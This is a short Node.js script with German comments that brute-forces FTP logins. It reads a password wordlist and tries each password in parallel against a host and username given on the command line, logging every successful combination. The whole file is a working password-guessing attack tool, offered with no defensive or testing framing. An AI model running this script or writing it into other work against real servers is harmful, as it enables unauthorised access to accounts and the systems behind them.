const fs = require('fs');
const ftp = require('ftp');

// Konsole leeren
console.clear();

// Argumente aus der Befehlszeile erhalten
const host = process.argv[2]; // FTP-Host als erstes Argument
const username = process.argv[3]; // FTP-Benutzername als zweites Argument

// Wordlist-Datei einlesen
const wordlist = fs.readFileSync('wordlist.lst', 'utf8');
const passwords = wordlist.split('\n').map((password) => password.trim()).filter(Boolean);

// FTP-Verbindung testen für jedes Passwort
passwords.forEach((password) => {
  const config = {
    host: host,
    user: username,
    password: password,
  };

  const client = new ftp();

  client.on('ready', () => {
    console.log(`Erfolgreiche FTP-Verbindung mit ${host}:${username}:${password}`);
    client.end();
  });

  client.on('error', (err) => {
    if (err.code === 530) {
      console.log(`Fehler beim Verbinden mit ${host}:${username}:${password}: Login fehlgeschlagen.`);
    } else {
      console.log(`Fehler beim Verbinden mit ${host}:${username}:${password}:`, err);
    }
  });

  try {
    client.connect(config);
  } catch (err) {
    console.log(`Fehler beim Verbinden mit ${host}:${username}:${password}:`, err);
  }
});
